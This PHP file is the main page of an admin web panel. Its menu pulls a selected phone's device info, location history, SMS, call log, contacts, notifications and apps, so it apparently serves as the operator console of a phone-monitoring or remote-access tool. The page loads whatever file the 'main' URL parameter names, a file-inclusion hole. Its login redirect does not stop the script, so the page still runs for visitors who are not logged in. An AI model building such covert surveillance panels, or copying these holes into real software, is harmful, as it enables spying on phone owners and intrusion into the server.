<?php 
session_start();

require 'conf.php';

if(!isset($_SESSION["login"])){
	header("location: login.php");
}

 ?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <title>Admin Control Panel</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
    <link href="//netdna.bootstrapcdn.com/bootstrap/3.0.0/css/bootstrap.min.css" rel="stylesheet" id="bootstrap-css">
    <style type="text/css">
    @import url(http://netdna.bootstrapcdn.com/font-awesome/4.0.3/css/font-awesome.min.css);
    body{margin-top:20px;}
    .fa-fw {width: 2em;}
    </style>
    <script src="//code.jquery.com/jquery-1.10.2.min.js"></script>
    <script src="//netdna.bootstrapcdn.com/bootstrap/3.0.0/js/bootstrap.min.js"></script>
    <script type="text/javascript">
        window.alert = function(){};
        var defaultCSS = document.getElementById('bootstrap-css');
        function changeCSS(css){
            if(css) $('head > link').filter(':first').replaceWith('<link rel="stylesheet" href="'+ css +'" type="text/css" />'); 
            else $('head > link').filter(':first').replaceWith(defaultCSS); 
        }
        $( document ).ready(function() {
          var iframe_height = parseInt($('html').height()); 
          window.parent.postMessage( iframe_height, 'https://bootsnipp.com');
        });
    </script>
    <link rel="stylesheet" type="text/css" href="<?=$style_css?>">
    <link rel="icon" type="image/png" href="<?=$favicon?>"/>
</head>

<body>
<div class="page-container">
  
    <!-- top navbar -->
    <div class="navbar navbar-default navbar-fixed-top" role="navigation">
       <div class="container">
        <div class="navbar-header">
           <a class="navbar-brand" href="./index.php">Admin's Web Panel</a>
           <button type="button" class="navbar-toggle" data-toggle="offcanvas" data-target=".sidebar-nav">
             <span class="icon-bar"></span>
             <span class="icon-bar"></span>
             <span class="icon-bar"></span>
           </button>
        </div>
       </div>
    </div>
      
    <div class="container">
      <div class="row row-offcanvas row-offcanvas-left">
        
        <!-- sidebar -->
        <div class="col-xs-6 col-sm-3 sidebar-offcanvas" id="sidebar" role="navigation">
            <ul class="nav">
              <li><a href"#"><b><?php echo $_SESSION['display'];?></b></a></li>
              <li><a href="?main=seldev.php">Select Device</a></li>
              <li><a href="?main=devinfo.php">Device Info</a></li>
              <li><a href="?main=lochistory.php">Location History</a></li>
              <li><a href="?main=sms.php">SMS</a></li>
              <li><a href="?main=calllog.php">Call Log</a></li>
              <li><a href="?main=contact.php">Contacts</a></li>
              <li><a href="?main=notif.php">Notifications</a></li>
              <li><a href="?main=apps.php">Apps</a></li>
              <li><a href="logout.php">Logout</a></li>           
            </ul>
        </div>

        <!-- main area -->
        <div class="col-xs-12 col-sm-9">   
          
        <?php 

        if (isset($_GET['main']))
        require $_GET['main'] 
        
        ?>
          
        </div><!-- /.col-xs-12 main -->
    </div><!--/.row-->
  </div><!--/.container-->
</div><!--/.page-container-->
    <script type="text/javascript">
        $(document).ready(function() {
  $('[data-toggle=offcanvas]').click(function() {
    $('.row-offcanvas').toggleClass('active');
  });
});
    </script>
</body>
</html>